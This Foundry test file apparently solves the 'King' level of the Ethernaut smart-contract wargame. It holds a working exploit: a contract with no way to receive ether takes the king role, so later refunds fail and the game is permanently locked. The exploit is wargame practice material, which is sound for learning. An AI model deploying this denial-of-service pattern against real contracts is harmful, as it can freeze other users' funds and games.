// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {KingFactory} from "../src/levels/09-KingFactory.sol";
import {King} from "../src/levels/09-King.sol";
import {Ethernaut} from "../src/core/Ethernaut.sol";

contract GrumpyKing {
    function coronate(address payable where) public payable {
        where.call{value: msg.value}("");
    }
}

contract KingSolution is Test {
    Ethernaut internal ethernaut;
    address internal attacker = address(1337);
    KingFactory internal factory;

    function solution(King target) internal virtual {
        GrumpyKing grumpy = new GrumpyKing();
        grumpy.coronate{value: 0.001 ether}(payable(target));
    }

    function testSolution() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether/10);

        factory = new KingFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance{value: 0.001 ether}(factory);
        King kingContract = King(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        solution(kingContract);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool isLevelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(isLevelSuccessfullyPassed);
    }
}
